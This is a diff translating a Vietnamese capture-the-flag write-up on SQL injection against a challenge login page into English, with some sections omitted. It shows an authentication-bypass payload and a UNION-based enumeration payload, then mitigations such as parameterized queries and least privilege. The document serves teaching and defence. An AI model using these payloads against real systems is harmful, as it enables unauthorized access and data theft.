@@ -17,15 +17,15 @@ categories = ['CTF Write-ups', 'Web Security']
 ## Description
 
 ```
-Chúng tôi phát hiện một trang web đăng nhập có vẻ không an toàn.
-Hãy tìm cách bypass authentication và lấy flag!
+We detected a login page that seems insecure.
+Find a way to bypass authentication and retrieve the flag!
 
 URL: http://challenge.cyberknight.vn:8080
 ```
 
 ## Initial Analysis
 
-Khi truy cập vào trang web, chúng ta thấy một form đăng nhập đơn giản:
+When visiting the website, we are presented with a simple login form:
 
 ```html
 <form method="POST" action="/login">
@@ -37,48 +37,48 @@ Khi truy cập vào trang web, chúng ta thấy một form đăng nhập đơn g
 
 ### Testing for SQL Injection
 
-Thử payload cơ bản:
+Trying a basic payload:
 ```
 Username: admin' OR '1'='1
 Password: anything
 ```
 
-**Kết quả**: Error message xuất hiện!
+**Result**: An error message appears!
 ```
 SQL Error: You have an error in your SQL syntax...
 ```
 
-Điều này xác nhận trang web dễ bị tấn công SQL Injection.
+This confirms that the web application is vulnerable to SQL Injection.
 
 ## Exploitation
 
 ### Step 1: Bypass Authentication
 
-Sử dụng payload classic:
+Using a classic payload:
 ```sql
 Username: admin' OR '1'='1' --
-Password: (bỏ trống)
+Password: (leave blank)
 ```
 
-**Giải thích**:
-- `admin'` đóng string trong query
-- `OR '1'='1'` luôn đúng
-- `--` comment phần còn lại của query
+**Explanation**:
+- `admin'` closes the string in the query.
+- `OR '1'='1'` is a condition that always evaluates to true.
+- `--` comments out the rest of the query.
 
-Query backend có thể trông như:
+The backend query likely looks something like this:
 ```sql
 SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='...'
 ```
 
 ### Step 2: Enumerate Database
 
-Sau khi bypass login, chúng ta cần tìm flag. Sử dụng UNION-based SQLi:
+After successfully bypassing the login, we need to locate the flag. We can use UNION-based SQLi:
 
 ```sql
 ' UNION SELECT 1,2,3,4,5 --
 ```
 
-Thử từng số column cho đến khi không còn error. Giả sử có 5 columns.
+Iterate through the number of columns until there is no error. Let's assume the table has 5 columns.
 
 ### Step 3: Extract Database Information
 
@@ -160,38 +160,38 @@ $stmt->execute([$username, $password]);
 import re
 
 def validate_username(username):
-    # Only allow alphanumeric and underscore
+    # Only allow alphanumeric and underscore characters
     if not re.match(r'^[a-zA-Z0-9_]+$', username):
         return False
     return True
 ```
 
-### 3. Least Privilege Principle
+### 3. Principle of Least Privilege
 
 ```sql
--- Tạo user với quyền hạn chế
+-- Create a user with restricted permissions
 CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
 GRANT SELECT ON database.users TO 'app_user'@'localhost';
--- Không cho quyền truy cập information_schema
+-- Do not grant access to information_schema
 ```
 
 ### 4. Web Application Firewall (WAF)
 
-Sử dụng ModSecurity hoặc cloud WAF để filter các pattern SQL injection.
+Utilize ModSecurity or a cloud WAF to filter common SQL injection patterns.
 
 ## Lessons Learned
 
-1. **Never trust user input**: Luôn validate và sanitize
-2. **Use parameterized queries**: Tránh string concatenation
-3. **Principle of least privilege**: Database user chỉ có quyền cần thiết
-4. **Error handling**: Không hiển thị SQL errors cho users
-5. **Security testing**: Regular penetration testing và code review
+1. **Never trust user input**: Always validate and sanitize.
+2. **Use parameterized queries**: Avoid string concatenation in queries.
+3. **Principle of least privilege**: The database user should only have necessary permissions.
+4. **Error handling**: Never display raw SQL errors to users.
+5. **Security testing**: Conduct regular penetration testing and code reviews.
 
 ## Tools Used
 
-- **Burp Suite**: Intercept và modify requests
-- **SQLMap**: Automated SQL injection tool
-- **Browser DevTools**: Analyze responses
+- **Burp Suite**: To intercept and modify HTTP requests.
+- **SQLMap**: Automated SQL injection tool.
+- **Browser DevTools**: To analyze server responses.
 
 ## References
 
@@ -203,4 +203,4 @@ Sử dụng ModSecurity hoặc cloud WAF để filter các pattern SQL injection
 
 **Difficulty Rating**: ⭐⭐⭐☆☆
 
-Nếu bạn có câu hỏi về write-up này, hãy liên hệ: nhatran.network@gmail.com
+If you have any questions regarding this write-up, feel free to contact: nhatran.network@gmail.com
